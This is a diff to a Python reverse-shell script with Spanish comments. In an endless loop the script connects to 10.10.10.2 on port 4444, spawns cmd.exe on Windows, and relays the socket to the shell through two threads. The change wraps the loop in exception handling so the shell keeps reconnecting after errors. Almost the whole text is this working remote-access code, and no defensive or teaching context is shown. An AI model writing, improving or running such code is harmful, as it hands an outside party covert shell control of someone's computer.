@@ -17,24 +17,30 @@ def p2s(s, p):
         s.send(p.stdout.read(1))
 
 while True:  # Bucle infinito
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("10.10.10.2", 4444))
+    try:  # Agregamos un bloque try-except para manejar la excepción KeyboardInterrupt
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(("10.10.10.2", 4444))
 
-    if os.name == "nt":  # Comprobar si el sistema operativo es Windows
-        p = subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+        if os.name == "nt":  # Comprobar si el sistema operativo es Windows
+            p = subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
 
-    s2p_thread = threading.Thread(target=s2p, args=[s, p])
-    s2p_thread.daemon = True
-    s2p_thread.start()
+        s2p_thread = threading.Thread(target=s2p, args=[s, p])
+        s2p_thread.daemon = True
+        s2p_thread.start()
 
-    p2s_thread = threading.Thread(target=p2s, args=[s, p])
-    p2s_thread.daemon = True
-    p2s_thread.start()
+        p2s_thread = threading.Thread(target=p2s, args=[s, p])
+        p2s_thread.daemon = True
+        p2s_thread.start()
 
-    try:
-        p.wait()
-    except KeyboardInterrupt:
+        try:
+            p.wait()
+        except KeyboardInterrupt:
+            pass
+
         s.close()
+    except Exception as e:
+        print(f"Se produjo un error: {e}")
+
 
 
 
